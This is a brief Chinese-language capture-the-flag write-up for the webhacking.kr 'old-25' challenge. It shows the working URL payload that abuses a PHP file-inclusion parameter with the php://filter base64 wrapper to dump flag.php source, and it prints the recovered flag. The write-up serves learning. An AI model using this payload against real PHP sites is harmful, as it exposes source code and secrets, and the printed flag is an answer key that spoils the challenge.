# old-25_150

* 一進到這一個網頁，可以看到一個非常重要的東東 --- flag.php
* 所以訪問一下 http://webhacking.kr:10001/?file=flag 可以得知 flag 在 code 裡面
* 這時，提示已經非常明顯了，這一題要考的是 php 偽協議
* 所以訪問 http://webhacking.kr:10001/?file=php://filter/convert.base64-encode/resource=flag 之後，再經過 base64 decode 過後，可以拿到 flag `FLAG{this_is_your_first_flag}`
* 拿到 flag 之後，要在 https://webhacking.kr/auth.php 中輸入 flag
